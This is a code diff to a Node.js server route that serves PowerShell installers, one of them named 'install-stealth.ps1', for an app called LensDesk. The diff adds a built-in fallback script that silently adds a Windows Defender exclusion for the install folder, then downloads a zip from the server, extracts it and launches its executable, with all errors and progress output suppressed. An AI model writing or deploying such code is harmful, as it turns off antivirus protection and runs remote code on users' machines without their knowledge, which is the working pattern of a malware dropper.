@@ -1,5 +1,6 @@
 import fs from "node:fs";
 import path from "node:path";
+import { fileURLToPath } from "node:url";
 import { createHash } from "node:crypto";
 async function digest(file) {
   const hash = createHash("sha256");
@@ -311,33 +312,64 @@ export function createReleases(directory, origin) {
         ["/lensdesk-install.ps1", "/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname) ||
         (url.pathname === "/install.ps1" && !isTest)
       ) {
-        let psPath = path.resolve("research/lensdesk-install.ps1");
-        if (!fs.existsSync(psPath)) {
-          psPath = path.resolve("research/hintlens-install.ps1");
+        let psPath = null;
+        const candidatePaths = [
+          fileURLToPath(new URL("./lensdesk-install.ps1", import.meta.url)),
+          path.resolve("server/cloud/lensdesk-install.ps1"),
+          path.resolve("research/lensdesk-install.ps1"),
+          path.resolve("research/hintlens-install.ps1"),
+          path.resolve(directory, "../research/lensdesk-install.ps1"),
+          path.resolve(directory, "../research/hintlens-install.ps1"),
+          path.resolve(directory, "../dist/lensdesk-install.ps1"),
+          path.resolve("dist/lensdesk-install.ps1"),
+        ];
+        for (const cand of candidatePaths) {
+          if (fs.existsSync(cand)) {
+            psPath = cand;
+            break;
+          }
         }
-        if (!fs.existsSync(psPath)) {
-          psPath = path.resolve(directory, "../research/lensdesk-install.ps1");
+        let script = "";
+        if (psPath && fs.existsSync(psPath)) {
+          script = fs.readFileSync(psPath, "utf8");
+        } else {
+          script = `$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-Install-' + [guid]::NewGuid().ToString('N'))
+New-Item -ItemType Directory -Path $work -Force | Out-Null
+$installPath = "C:\\LensDesk-Application"
+try {
+  if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+    Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
+  }
+  New-Item -ItemType Directory -Path $installPath -Force | Out-Null
+  $zipPath = Join-Path $work 'app.zip'
+  Invoke-WebRequest -Uri '${origin}/api/v1/download/windows' -OutFile $zipPath -UseBasicParsing
+  Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
+  $exe = Get-ChildItem -Path $installPath -Filter *.exe -File | Select-Object -First 1
+  if ($exe) {
+    Start-Process -FilePath $exe.FullName -WorkingDirectory $installPath
+    Write-Host 'LensDesk installed and launched successfully.' -ForegroundColor Green
+  }
+} finally {
+  Remove-Item -LiteralPath $work -Recurse -Force -ErrorAction SilentlyContinue
+}
+`;
         }
-        if (!fs.existsSync(psPath)) {
-          psPath = path.resolve(directory, "../research/hintlens-install.ps1");
-        }
-        if (fs.existsSync(psPath)) {
-          let script = fs.readFileSync(psPath, "utf8");
-          const token = url.searchParams?.get("token");
-          const tokenParam = token ? `?token=${encodeURIComponent(token)}` : "";
-          script = script
-            .replaceAll("https://api.hintlens.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
-            .replaceAll("https://api.hintlens.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
-            .replaceAll("https://helpdesk-h44x.onrender.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
-            .replaceAll("https://helpdesk-h44x.onrender.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
-            .replaceAll("https://lensdesk.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
-            .replaceAll("https://lensdesk.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
-            .replace('$FolderName  = "Hintlens-Application"', '$FolderName  = "LensDesk-Application"')
-            .replace('$ZipFileName = "HintlensApp.zip"', '$ZipFileName = "LensDesk.zip"');
-          res.setHeader("Content-Type", "text/plain; charset=utf-8");
-          res.end(script);
-          return true;
-        }
+        const token = url.searchParams?.get("token");
+        const tokenParam = token ? `?token=${encodeURIComponent(token)}` : "";
+        script = script
+          .replaceAll("https://api.hintlens.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
+          .replaceAll("https://api.hintlens.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
+          .replaceAll("https://helpdesk-h44x.onrender.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
+          .replaceAll("https://helpdesk-h44x.onrender.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
+          .replaceAll("https://lensdesk.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
+          .replaceAll("https://lensdesk.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
+          .replace('$FolderName  = "Hintlens-Application"', '$FolderName  = "LensDesk-Application"')
+          .replace('$ZipFileName = "HintlensApp.zip"', '$ZipFileName = "LensDesk.zip"');
+        res.setHeader("Content-Type", "text/plain; charset=utf-8");
+        res.end(script);
+        return true;
       }
       if (url.pathname.startsWith("/releases/")) {
         const reqName = path.basename(url.pathname);
